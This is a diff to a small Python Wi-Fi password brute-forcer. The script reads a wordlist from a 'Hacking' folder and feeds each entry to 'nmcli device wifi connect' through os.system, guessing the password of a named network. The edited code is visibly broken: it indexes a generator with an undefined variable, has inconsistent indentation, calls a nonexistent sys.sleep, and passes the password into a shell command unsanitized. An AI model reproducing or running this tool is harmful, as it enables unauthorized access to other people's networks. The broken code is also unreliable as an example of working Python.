@@ -13,24 +13,55 @@ U_name = input("username:")
 def pas():
 	os.chdir('/home/alex/Documents/Hacking')
 	with open ("passwords.txt","r") as f :
-		chunk_size = 1000
-		while True:
-			password = f.readlines(chunk_size)
-			return password
+		for line in f:
+		    yield line.strip()
 
-print("""
+banner = """
 
 
 
 
-			_____BRUTEFORCER STARTING_____		
+_____BRUTEFORCER STARTING_____		
 
-								""" )
+								
+								
+								
+								  \n """ 
+								
+for i in banner:
+    sys.stdout.write(i)
+    sys.stdout.flush()
+    time.sleep(0.05)
+								
 
 stm = "nmcli device wifi connect"
 
 pswd_lst = pas()
-x = 0
 
-while (x < 1000):
-	time.sleep(0.1)
+
+for pswd in pswd_lst:
+
+    try:
+	    time.sleep(0.1)
+	    pswd = pswd_lst[x].rstrip('\n')
+	    cmd = stm +" "+ U_name+" " + "password" +" " +  " \"" + pswd + "\""
+        os.system(cmd)
+        time .sleep(0.01)
+        
+    except Exception as e:
+        print(" +++ == AN ERROR OCCURED == +++")
+        print(f"{e}")
+        break
+
+end_msg = " ___ BRUTEFORCE completed ___"
+
+for i in end_msg:
+    sys.stdout.write(i)
+    sys.stdout.flush()
+    sys.sleep(0.05)
+    
+
+
+
+
+
